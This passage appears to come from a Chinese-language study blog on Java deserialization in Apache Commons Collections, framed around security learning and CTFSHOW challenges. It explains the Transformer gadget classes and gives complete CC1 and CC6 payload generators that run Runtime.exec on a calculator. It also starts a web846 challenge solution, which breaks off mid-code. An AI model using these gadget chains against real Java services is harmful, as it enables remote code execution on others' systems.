<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, keyTransformer,</span><br><span class="line">valueTransformer);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = transformKey(key);</span><br><span class="line">    value = transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，keyTransformer是处理新元素的Key的回调，valueTransformer是处理新元素的value的回调。 我们这⾥所说的”回调“，并不是传统意义上的⼀个回调函数，⽽是⼀个实现了Transformer接⼝的类。</p>
<h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a><strong>Transformer</strong></h4><p>Transformer是⼀个接⼝，它只有⼀个待实现的⽅法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个”回调 函数“，这个回调的参数是原始对象。</p>
<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>ConstantTransformer是实现了Transformer接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个 对象，并在transform⽅法将这个对象再返回：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line"> <span class="built_in">super</span>();</span><br><span class="line"> iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以他的作⽤其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作。</p>
<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序 列化能执⾏任意代码的关键。 在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数 是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[]</span></span><br><span class="line"><span class="params">args)</span> &#123;</span><br><span class="line"> <span class="built_in">super</span>();</span><br><span class="line"> iMethodName = methodName;</span><br><span class="line"> iParamTypes = paramTypes;</span><br><span class="line"> iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后⾯的回调transform⽅法，就是执⾏了input对象的iMethodName⽅法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line"> <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line"> <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line"> <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line"> <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +</span><br><span class="line">iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +</span><br><span class="line">iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line"> <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +</span><br><span class="line">iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure>

<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串 在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊.</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line"> <span class="built_in">super</span>();</span><br><span class="line"> iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line"> <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line"> object = iTransformers[i].transform(object);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="为什么执行put就会调用而且输入还是随便的呢？"><a href="#为什么执行put就会调用而且输入还是随便的呢？" class="headerlink" title="为什么执行put就会调用而且输入还是随便的呢？"></a>为什么执行put就会调用而且输入还是随便的呢？</h4><p>debug看一下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230402110648800.png" alt="image-20230402110648800"></p>
<p>堆栈：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transformValue:173, TransformedMap (org.apache.commons.collections.map) ()</span><br><span class="line">put:220, TransformedMap (org.apache.commons.collections.map) (          return valueTransformer.transform(object);      value = transformValue(value);)</span><br><span class="line">main:23, CommonCollections1 (org.example) (outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);)</span><br></pre></td></tr></table></figure>

<p>先回调用一个ConstantTransformer得到了我们的Runtime，然后之后在下一个transfmer里面执行invoke，over。</p>
<h3 id="CC1-1"><a href="#CC1-1" class="headerlink" title="CC1"></a>CC1</h3><h4 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h4><p>触发这个漏洞的核心，在于我们需要向Map中加入一个新的元素。在demo中，我们可以手工执行 outerMap.put(“test”, “xxxx”); 来触发漏洞，但在实际反序列化时，我们需要找到一个 类，它在反序列化的readObject逻辑里有类似的写入操作。</p>
<p>这个类就是 sun.reflect.annotation.AnnotationInvocationHandler ，我们查看它的readObject 方法(这是8u71以前的代码，8u71以后做了一些修改)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; t = (Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt;)fields.get(<span class="string">&quot;type&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(<span class="string">&quot;memberValues&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(t);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">    <span class="comment">// consistent with runtime Map type</span></span><br><span class="line">    Map&lt;String, Object&gt; mv = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                value = <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            objectToString(value))</span><br><span class="line">                    .setMember(annotationType.members().get(name));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        mv.put(name, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    UnsafeAccessor.setType(<span class="built_in">this</span>, t);</span><br><span class="line">    UnsafeAccessor.setMemberValues(<span class="built_in">this</span>, mv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心逻辑就是 <strong>Map.Entry memberValue : memberValues.entrySet() 和 memberValue.setValue(…) 。</strong></p>
<p>memberValues就是反序列化后得到的Map，也是经过了TransformedMap修饰的对象，这里遍历了它 的所有元素，并依次设置值。在调用setValue设置值的时候就会触发TransformedMap里注册的 Transform，进而执行我们为其精心设计的任意代码。</p>
<p>我们构造POC的时候，就需要创建一个AnnotationInvocationHandler对象，并将前面构造的 HashMap设置进来：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span></span><br><span class="line">Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure>

<p>这里因为 sun.reflect.annotation.AnnotationInvocationHandler 是在JDK内部的类，不能直接使 用new来实例化。我使用<strong>反射</strong>获取到了它的构造方法，并将其设置成外部可见的，再调用就可以实例化 了。 AnnotationInvocationHandler类的构造函数有两个参数，第一个参数是一个Annotation类；第二个是 参数就是前面构造的Map。</p>
<p>太多了，懒得写了，直接上payload</p>
<p>这用的是另外一条cc1，没用代理。。。。。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//完整的transformer</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span> &#125;), &#125;;</span><br><span class="line">        <span class="comment">//ChainedTransformer</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//修饰map</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部分细节分析：</p>
<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>), &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="comment">// 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 本地测试触发</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部分细节分析：</p>
<h2 id="java加载字节码方法"><a href="#java加载字节码方法" class="headerlink" title="java加载字节码方法"></a>java加载字节码方法</h2><h3 id="什么是字节码"><a href="#什么是字节码" class="headerlink" title="什么是字节码"></a>什么是字节码</h3><p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=4&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">类的动态加载_哔哩哔哩_bilibili</a></p>
<p>load&#x3D;&gt;find&#x3D;&gt;define</p>
<h3 id="利用URLClassLoader加载远程class文件"><a href="#利用URLClassLoader加载远程class文件" class="headerlink" title="利用URLClassLoader加载远程class文件"></a>利用URLClassLoader加载远程class文件</h3><h3 id="利用ClassLoader-defineClass直接加载字节码"><a href="#利用ClassLoader-defineClass直接加载字节码" class="headerlink" title="利用ClassLoader#defineClass直接加载字节码"></a>利用ClassLoader#defineClass直接加载字节码</h3><h3 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用TemplatesImpl加载字节码</h3><h3 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h3><p><a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader去哪了 | 离别歌 (leavesongs.com)</a></p>
<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><h2 id="TemplatesImpl在Shiro-中的利用"><a href="#TemplatesImpl在Shiro-中的利用" class="headerlink" title="TemplatesImpl在Shiro 中的利用"></a>TemplatesImpl在Shiro 中的利用</h2><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><h2 id="CommonsBeanutils与无-commons-collections的Shiro反序列化利用"><a href="#CommonsBeanutils与无-commons-collections的Shiro反序列化利用" class="headerlink" title="CommonsBeanutils与无 commons-collections的Shiro反序列化利用"></a>CommonsBeanutils与无 commons-collections的Shiro反序列化利用</h2><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p><a href="http://rui0.cn/archives/1015">Code-Breaking Puzzles — javacon WriteUp - Ruilin (rui0.cn)</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">Code-Breaking中的两个Python沙箱 | 离别歌 (leavesongs.com)</a></p>
<p><a href="http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/">Python反序列化漏洞的花式利用 | Bendawang’s site</a></p>
<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><h3 id="Java-runtime类介绍"><a href="#Java-runtime类介绍" class="headerlink" title="Java runtime类介绍"></a>Java runtime类介绍</h3><h3 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><p><a href="https://paper.seebug.org/1091/">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上） (seebug.org)</a></p>
<h3 id="LOG4J分析"><a href="#LOG4J分析" class="headerlink" title="LOG4J分析"></a>LOG4J分析</h3><h3 id="表达式上下文"><a href="#表达式上下文" class="headerlink" title="表达式上下文"></a>表达式上下文</h3><h2 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h2><p><a href="https://blog.csdn.net/miuzzx/article/details/128221385">CTFSHOW web入门 java反序列化篇（更新中）_ctfshow java_yu22x的博客-CSDN博客</a></p>
<p>[<a href="https://blog.csdn.net/solitudi/article/details/110499314">CTFSHOW]反序列化(仅更新必要的题目)_Y4tacker的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/128303093">CTFSHOW web入门 java反序列化篇 web855_ctfshow java_yu22x的博客-CSDN博客</a></p>
<h3 id="web846"><a href="#web846" class="headerlink" title="web846"></a>web846</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLStreamHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span 